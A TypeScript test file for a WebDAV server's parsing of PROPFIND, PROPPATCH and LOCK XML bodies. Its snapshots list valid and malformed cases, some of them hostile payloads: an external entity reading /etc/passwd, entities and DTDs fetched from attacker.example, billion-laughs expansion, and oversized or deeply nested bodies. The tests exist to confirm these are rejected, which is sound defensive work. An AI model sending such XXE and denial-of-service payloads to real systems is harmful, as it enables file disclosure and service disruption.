import { createHash } from "node:crypto";
import { describe, expect, it } from "vitest";
import { BODIES, DOCUMENTS, EMPTY, EMPTY_BODIES, STATUS, TABLE } from "./xml-bodies-cases";
import { buildWorld } from "./world";

// XML request bodies for PROPFIND, PROPPATCH and LOCK (PRD §11, §12): the table and oracle of
// xml-bodies-cases.ts, against the handler.

const NOW = Date.UTC(2026, 10, 2);

describe("XML request bodies", () => {
  it.each(TABLE)("%s with %s", async (method, _label, body) => {
    const world = await buildWorld({ scope: null, access: "read-write" });
    const text = body.build(DOCUMENTS[method], method);
    const response = await world.call(method, "/files/photos/a.jpg", {
      headers: { depth: "0", "content-type": "application/xml" },
      body: text,
    });
    const reply = await response.text();
    const valid = body.verdict === "valid";
    expect(valid ? [DOCUMENTS[method].success] : STATUS[body.verdict]).toContain(response.status);
    const properties = await world.backends.files.properties([["photos", "a.jpg"]]);
    const stored = properties.ok ? (properties.value["photos/a.jpg"] ?? []) : [];
    const locks = await world.locks.covering(["files", "photos", "a.jpg"], {
      descendants: false,
      now: NOW,
    });
    // Only a valid PROPPATCH stores the property, and only a valid LOCK takes a lock.
    expect(stored.map((p) => p.name)).toEqual(
      valid && method === "PROPPATCH" ? ["{urn:z}note"] : [],
    );
    expect(locks.length).toBe(valid && method === "LOCK" ? 1 : 0);
    // Nothing from a declaration ever comes back.
    expect(reply).not.toContain("boom");
    expect(reply).not.toContain("lollol");
  });

  it.each(EMPTY)("%s with an empty body answers %i", async (method, status) => {
    const world = await buildWorld({ scope: null });
    for (const body of EMPTY_BODIES) {
      const response = await world.call(method, "/files/photos/a.jpg", {
        headers: { depth: "0" },
        body,
      });
      await response.body?.cancel();
      expect(response.status).toBe(status);
    }
  });
});

// The bodies of the table, written out: each one's verdict and the document it sends for PROPFIND
// (long ones by their start, end and length), and a digest of the documents for PROPPATCH and LOCK.
// A change to a body or to a verdict fails here, not only in the comparison with the handler.
const shown = (text: string) =>
  text.length > 200
    ? `${JSON.stringify(text.slice(0, 70))}…${JSON.stringify(text.slice(-50))} (${text.length})`
    : JSON.stringify(text);

const digest = (text: string) => createHash("sha256").update(text).digest("hex").slice(0, 12);

describe("the XML bodies, written out", () => {
  it("builds each PROPFIND body", () => {
    expect(
      BODIES.map(
        (body) =>
          `${body.label} (${body.verdict}): ${shown(body.build(DOCUMENTS.PROPFIND, "PROPFIND"))}`,
      ),
    ).toMatchInlineSnapshot(`
      [
        "the canonical document (valid): "<?xml version=\\"1.0\\" encoding=\\"utf-8\\"?><D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfind>"",
        "no XML declaration (valid): "<D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfind>"",
        "whitespace before the root (valid): "\\n  \\t<D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfind>"",
        "a byte order mark (valid): "﻿<?xml version=\\"1.0\\" encoding=\\"utf-8\\"?><D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfind>"",
        "a comment before the root (valid): "<?xml version=\\"1.0\\" encoding=\\"utf-8\\"?><!-- c --><D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfind>"",
        "a comment inside the root (valid): "<D:propfind xmlns:D=\\"DAV:\\"><!-- c --><D:prop><D:getetag/></D:prop></D:propfind>"",
        "a processing instruction after the root (valid): "<D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfind><?app x?>"",
        "another prefix for DAV: (valid): "<a:propfind xmlns:a=\\"DAV:\\"><a:prop><a:getetag/></a:prop></a:propfind>"",
        "DAV: as the default namespace (valid): "<propfind xmlns=\\"DAV:\\"><prop><getetag/></prop></propfind>"",
        "single-quoted namespace (valid): "<D:propfind xmlns:D='DAV:'><D:prop><D:getetag/></D:prop></D:propfind>"",
        "an unknown DAV: element (valid): "<D:propfind xmlns:D=\\"DAV:\\"><D:unknown-extension/><D:prop><D:getetag/></D:prop></D:propfind>"",
        "an unknown element in another namespace (valid): "<D:propfind xmlns:D=\\"DAV:\\"><X:ext xmlns:X=\\"urn:x\\"><X:deep/></X:ext><D:prop><D:getetag/></D:prop></D:propfind>"",
        "unknown attributes (valid): "<D:propfind xmlns:D=\\"DAV:\\" extra=\\"1\\" xml:lang=\\"en\\"><D:prop><D:getetag/></D:prop></D:propfind>"",
        "a CDATA section of whitespace (valid): "<D:propfind xmlns:D=\\"DAV:\\"><![CDATA[ ]]><D:prop><D:getetag/></D:prop></D:propfind>"",
        "whitespace after the root (valid): "<D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfind>\\n\\n"",
        "upper-case encoding and standalone (valid): "<?xml version=\\"1.0\\" encoding=\\"UTF-8\\" standalone=\\"yes\\"?><D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfind>"",
        "nesting 32 levels deep (valid): "<D:propfind xmlns:D=\\"DAV:\\"><X:n xmlns:X=\\"urn:x\\"><X:n xmlns:X=\\"urn:x\\"><"…"n></X:n><D:prop><D:getetag/></D:prop></D:propfind>" (933)",
        "1,000 unknown siblings (valid): "<D:propfind xmlns:D=\\"DAV:\\"><X:s xmlns:X=\\"urn:x\\"/><X:s xmlns:X=\\"urn:x\\"/"…"urn:x\\"/><D:prop><D:getetag/></D:prop></D:propfind>" (22069)",
        "character and predefined entity references (valid): "<D:propfind xmlns:D=\\"DAV:\\"><X:t xmlns:X=\\"urn:x\\">&#65;&#x42;&amp;&lt;&gt;&quot;&apos;</X:t><D:prop><D:getetag/></D:prop></D:propfind>"",
        "the namespace declared on every element (valid): "<D:propfind xmlns:D=\\"DAV:\\"><D:prop xmlns:D=\\"DAV:\\"><D:getetag xmlns:D=\\"DAV:\\"/></D:prop></D:propfind>"",
        "a declaration and no root (malformed): "<?xml version=\\"1.0\\" encoding=\\"utf-8\\"?>"",
        "a body cut short by one character (malformed): "<D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfind"",
        "a body cut in half (malformed): "<D:propfind xmlns:D=\\"DAV:\\"><D:prop"",
        "a mismatched end tag (malformed): "<D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:other>"",
        "an unclosed root (malformed): "<D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop>"",
        "two root elements (malformed): "<D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfind><D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfind>"",
        "text before the root (malformed): "junk<D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfind>"",
        "whitespace before the declaration (malformed): " <?xml version=\\"1.0\\" encoding=\\"utf-8\\"?><D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfind>"",
        "a declaration after the start (malformed): "<D:propfind xmlns:D=\\"DAV:\\"><?xml version=\\"1.0\\" encoding=\\"utf-8\\"?><D:prop><D:getetag/></D:prop></D:propfind>"",
        "an undeclared prefix (malformed): "<D:propfind><D:prop><D:getetag/></D:prop></D:propfind>"",
        "an undefined entity (malformed): "<D:propfind xmlns:D=\\"DAV:\\">&undefined;<D:prop><D:getetag/></D:prop></D:propfind>"",
        "a character reference to NUL (malformed): "<D:propfind xmlns:D=\\"DAV:\\">&#0;<D:prop><D:getetag/></D:prop></D:propfind>"",
        "a raw control character (malformed): "<D:propfind xmlns:D=\\"DAV:\\">\\u0001<D:prop><D:getetag/></D:prop></D:propfind>"",
        "a raw < in an attribute (malformed): "<D:propfind xmlns:D=\\"DAV:\\"><X:a xmlns:X=\\"urn:x\\" v=\\"<\\"/><D:prop><D:getetag/></D:prop></D:propfind>"",
        "an unquoted attribute (malformed): "<D:propfind xmlns:D=\\"DAV:\\"><X:a xmlns:X=\\"urn:x\\" v=1/><D:prop><D:getetag/></D:prop></D:propfind>"",
        "a duplicate attribute (malformed): "<D:propfind xmlns:D=\\"DAV:\\"><X:a xmlns:X=\\"urn:x\\" v=\\"1\\" v=\\"2\\"/><D:prop><D:getetag/></D:prop></D:propfind>"",
        "a name starting with a digit (malformed): "<D:propfind xmlns:D=\\"DAV:\\"><1bad/><D:prop><D:getetag/></D:prop></D:propfind>"",
        "an unterminated CDATA section (malformed): "<D:propfind xmlns:D=\\"DAV:\\"><![CDATA[ x<D:prop><D:getetag/></D:prop></D:propfind>"",
        "an unterminated comment (malformed): "<D:propfind xmlns:D=\\"DAV:\\"><!-- x<D:prop><D:getetag/></D:prop></D:propfind>"",
        "a double hyphen in a comment (malformed): "<D:propfind xmlns:D=\\"DAV:\\"><!-- a -- b --><D:prop><D:getetag/></D:prop></D:propfind>"",
        "a bare DOCTYPE (malformed): "<!DOCTYPE propfind><D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfind>"",
        "an internal entity (malformed): "<!DOCTYPE x [<!ENTITY e \\"boom\\">]><D:propfind xmlns:D=\\"DAV:\\">&e;<D:prop><D:getetag/></D:prop></D:propfind>"",
        "billion laughs (malformed): "<!DOCTYPE x [<!ENTITY a \\"lol\\"><!ENTITY b \\"&a;&a;&a;&a;&a;&a;&a;&a;&a;&"…"bbbbbbb;<D:prop><D:getetag/></D:prop></D:propfind>" (824)",
        "an external entity (malformed): "<!DOCTYPE x [<!ENTITY e SYSTEM \\"file:///etc/passwd\\">]><D:propfind xmlns:D=\\"DAV:\\">&e;<D:prop><D:getetag/></D:prop></D:propfind>"",
        "an external parameter entity (malformed): "<!DOCTYPE x [<!ENTITY % p SYSTEM \\"http://attacker.example/x.dtd\\"> %p;]><D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfind>"",
        "an external DTD (malformed): "<!DOCTYPE x SYSTEM \\"http://attacker.example/x.dtd\\"><D:propfind xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfind>"",
        "a root without a namespace (malformed): "<propfind xmlns:D=\\"DAV:\\"><prop><getetag/></prop></propfind>"",
        "a root in the namespace DAV (malformed): "<D:propfind xmlns:D=\\"DAV\\"><D:prop><D:getetag/></D:prop></D:propfind>"",
        "a root in the namespace dav: (malformed): "<D:propfind xmlns:D=\\"dav:\\"><D:prop><D:getetag/></D:prop></D:propfind>"",
        "a root with the wrong name (malformed): "<D:propfindx xmlns:D=\\"DAV:\\"><D:prop><D:getetag/></D:prop></D:propfindx>"",
        "another method's document (malformed): "<?xml version=\\"1.0\\" encoding=\\"utf-8\\"?><D:lockinfo xmlns:D=\\"DAV:\\"><D:lockscope><D:exclusive/></D:lockscope><D:locktype><D:write/></D:locktype></D:lockinfo>"",
        "nesting 5,000 levels deep (malformed): "<D:propfind xmlns:D=\\"DAV:\\"><X:n xmlns:X=\\"urn:x\\"><X:n xmlns:X=\\"urn:x\\"><"…"n></X:n><D:prop><D:getetag/></D:prop></D:propfind>" (135069)",
        "100,000 elements (malformed): "<D:propfind xmlns:D=\\"DAV:\\"><D:x/><D:x/><D:x/><D:x/><D:x/><D:x/><D:x/><"…"/><D:x/><D:prop><D:getetag/></D:prop></D:propfind>" (600069)",
        "2 MiB of whitespace (too big): "<D:propfind xmlns:D=\\"DAV:\\">                                           "…"        <D:prop><D:getetag/></D:prop></D:propfind>" (2097221)",
        "a 2 MiB text node (too big): "<D:propfind xmlns:D=\\"DAV:\\"><X:t xmlns:X=\\"urn:x\\">aaaaaaaaaaaaaaaaaaaaaa"…"aa</X:t><D:prop><D:getetag/></D:prop></D:propfind>" (2097248)",
      ]
    `);
  });

  it("builds each PROPPATCH and LOCK body", () => {
    expect(
      BODIES.map(
        (body) =>
          `${body.label}: ${digest(body.build(DOCUMENTS.PROPPATCH, "PROPPATCH"))} ${digest(body.build(DOCUMENTS.LOCK, "LOCK"))}`,
      ),
    ).toMatchInlineSnapshot(`
      [
        "the canonical document: b215b860cabf cd826b16068d",
        "no XML declaration: 59b6b4f113b0 6509601c57ce",
        "whitespace before the root: 6abfd5c4b5b9 dc7b86566895",
        "a byte order mark: 2a3d544510dc 579da590419a",
        "a comment before the root: 0eb92800faed 08ff895b52a3",
        "a comment inside the root: 1e024b5bc0cc 43613d75a64d",
        "a processing instruction after the root: 0882a2440bb2 359b1b1e3c6c",
        "another prefix for DAV:: 601b025c5b3f 1739c908d5b8",
        "DAV: as the default namespace: 45f30adbe333 4932ca501f14",
        "single-quoted namespace: d016337320c3 a8feb506f6e1",
        "an unknown DAV: element: bad415d5243d 678322b95f0c",
        "an unknown element in another namespace: 04c80ab1a6a0 bbe6d6e9c7c2",
        "unknown attributes: 8ef80470b6bd 28e2eb45b47c",
        "a CDATA section of whitespace: 878635aec37a 3e0844a5fe25",
        "whitespace after the root: 0c63845e0f31 f4160bd68917",
        "upper-case encoding and standalone: 74c996ee9b46 fb528dcfb8db",
        "nesting 32 levels deep: 7c984158e052 950e9e0cd5d9",
        "1,000 unknown siblings: 1ea4e3504fa9 afa50949186e",
        "character and predefined entity references: 0c441aa54dcb c3626e74b03b",
        "the namespace declared on every element: 275980b1de97 be7eaec6343c",
        "a declaration and no root: 86e0a4d4f900 86e0a4d4f900",
        "a body cut short by one character: 6e238ea2377e ef2162c7cfc3",
        "a body cut in half: 4da35e95efdf af7075325935",
        "a mismatched end tag: a9745212bf30 172c9d7d6a88",
        "an unclosed root: 301a9b64538e dd19e83383da",
        "two root elements: ce94bbf690c7 19f8e628dc16",
        "text before the root: b836df8970f4 325781dc346f",
        "whitespace before the declaration: 0a5eeceb848a c67489239b65",
        "a declaration after the start: cbb7b72f4e21 792a041fa75e",
        "an undeclared prefix: b8f7612cca1d b00bde7cb07b",
        "an undefined entity: 90525a783b42 5d9d4d2a80df",
        "a character reference to NUL: 6ec059f1ce29 783040c1a98d",
        "a raw control character: 8f290d52b85a 36a35e1198d8",
        "a raw < in an attribute: 0bd41e868812 0dedb758fd6e",
        "an unquoted attribute: f1384594e638 643edafd9a57",
        "a duplicate attribute: 684f33ff6f88 a0daff2fb598",
        "a name starting with a digit: c41e6331e5b9 03fc0cad9e7e",
        "an unterminated CDATA section: a123bb0d32b8 ad783f74f510",
        "an unterminated comment: fc1879abc2b5 2efa76d8d8c1",
        "a double hyphen in a comment: a5a15a3580f8 f12804ed99b4",
        "a bare DOCTYPE: 8f7a48cb28b8 c3b22ead4e3b",
        "an internal entity: 18b3d50692d4 8b4fb62c98ed",
        "billion laughs: c800e1dd9aa3 9de0fb5b4f12",
        "an external entity: c8102178da9f 4536d0b9d1e5",
        "an external parameter entity: 368d88975d85 352d3db49ad9",
        "an external DTD: 5cd86e6248e7 866f6035c2a6",
        "a root without a namespace: ebb1245d13dd b5c564cfbc2c",
        "a root in the namespace DAV: 048b331b87fb 0c935fe2a96f",
        "a root in the namespace dav:: d2bd67f1084a 89fe3c5f4221",
        "a root with the wrong name: e14ee645bc1e 99b3cf35765f",
        "another method's document: 417212e921d6 b215b860cabf",
        "nesting 5,000 levels deep: dcc92bfae2b4 b851be5fce27",
        "100,000 elements: 2ff88abcdc67 41ec48d7b055",
        "2 MiB of whitespace: 63a138d87186 a60ef384ac8b",
        "a 2 MiB text node: 3005e2470b12 04ecb0230dfd",
      ]
    `);
  });

  it("refuses what is not valid and answers an empty body", () => {
    expect(STATUS).toEqual({ malformed: [400], "too big": [413, 400] });
    expect(EMPTY).toEqual([
      ["PROPFIND", 207],
      ["PROPPATCH", 400],
      ["LOCK", 400],
    ]);
    expect(EMPTY_BODIES).toEqual(["", " \r\n\t"]);
    expect(TABLE.map(([method, label]) => `${method} ${label}`)).toHaveLength(3 * BODIES.length);
    expect(new Set(TABLE.map(([method]) => method))).toEqual(
      new Set(["PROPFIND", "PROPPATCH", "LOCK"]),
    );
  });
});
